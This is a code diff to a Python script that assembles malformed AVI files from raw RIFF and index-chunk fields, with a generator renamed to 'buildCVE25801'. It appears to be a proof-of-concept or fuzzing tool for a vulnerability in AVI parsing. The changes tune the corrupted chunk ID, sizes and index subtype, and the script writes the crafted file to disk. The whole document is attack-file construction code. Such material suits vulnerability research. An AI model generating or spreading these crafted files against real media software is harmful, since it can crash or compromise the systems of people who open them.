@@ -331,13 +331,13 @@ class invalidChunk:
     pad = pBL(0x00000000)
     '''
     #FOURCC fcc;
-    ckID = b'ix01' #+b'\x01' + b'\x01'
+    ckID = b'strh' #+b'\x01' + b'\x01'
     #DWORD cb;
     ckSize = pBL(0x00000000)#pBL(0x00000000) #points to first? avistdindex_chunk
     #WORD wLongsPerEntry; // size of each entry in aIndex array "must be 3"??
     wLongsPerEntry = pBS(0x0200) #0200
     #BYTE bIndexSubType;
-    bIndexSubType = b'\x00' #00
+    bIndexSubType = b'\x01' #00
     #BYTE bIndexType; // one of AVI_INDEX_* codes
     bIndexType = b'\x01' # AVI_INDEX_2FIELD
     #DWORD nEntriesInUse; // index of first unused member in aIndex array
@@ -347,10 +347,10 @@ class invalidChunk:
 
     def __init__(self):
         l = len(self.build())
-        self.ckSize = pLL(l)
+        self.ckSize = pLL(l-8)
 
     def build(self):
-        return self.ckID + self.ckSize + self.wLongsPerEntry + self.bIndexSubType + self.bIndexType + self.nEntriesInuse + self.pad1 + self.pad1 +  self.pad1 + self.pad1 +  self.pad1 +  self.pad1 +  self.pad1 + self.pad0
+        return self.ckID + self.ckSize + self.wLongsPerEntry + self.bIndexSubType + self.bIndexType + self.nEntriesInuse + self.pad1 + self.pad1 +  self.pad1 + self.pad1 +  self.pad1 +  self.pad1 +  self.pad1 +  self.pad1 +  self.pad1 + self.pad0
 
 def buildAvi():
     vidSize = (0x400-0x7)
@@ -455,7 +455,7 @@ def buildInvalidAvi():
 
     return ret
  
-def buildInvalidAvi2774():
+def buildCVE25801():
     vidSize = (0x400-0x7)
     numList = 4
     indexSize = 0x00000f00 #4C #indexes will be paded to this
@@ -490,7 +490,7 @@ def buildInvalidAvi2774():
     moviList = listChunk(0).build()
     odmlList = listChunk((0)).build()
     invalidList = listChunk((0)).build()
-    afterIndx =  invalidList + invalid + moviList + movi #+ indxField + vidData + odmlList + odml 
+    afterIndx =   invalid + moviList + movi #+ indxField + vidData + odmlList + odml 
     full = riff + mainHeaderList + mainHead + subHeaderList1 + streamHead + strfC + indx + afterIndx
 
     isc.qwOffset = pLL(len(full) - len(afterIndx)+0x10) + pLL(0x00000000)
@@ -502,15 +502,15 @@ def buildInvalidAvi2774():
     strlLen = len(full) - len(afterIndx) - len(riff + mainHeaderList + mainHead + subHeaderList1) + 4
     mainHeaderList = listChunk(hdrlLen).build()
     subHeaderList1 = listChunk(strlLen).build()
-    moviList = listChunk(len(movi+invalid+invalidList)).build()
-    odmlList = listChunk(len(odml)).build()
-    invalidList = listChunk(len(invalid)).build()
+    moviList = listChunk(len(movi+invalid)).build()
+    #odmlList = listChunk(len(odml)).build()
+    #invalidList = listChunk(len(invalid)).build()
 
-    ret = riff + mainHeaderList + mainHead + subHeaderList1 + streamHead + strfC + indx +  moviList + movi + invalidList + invalid  #+ indxField + vidData
+    ret = riff + mainHeaderList + mainHead + subHeaderList1 + streamHead + strfC + indx +  moviList + movi + invalid  #+ indxField + vidData
 
     return ret
 
-content = buildInvalidAvi2774()
+content = buildCVE25801()
 
 
 filename = ".ignore\\"+ "test" + str(randint(0,10000)) + ".avi"
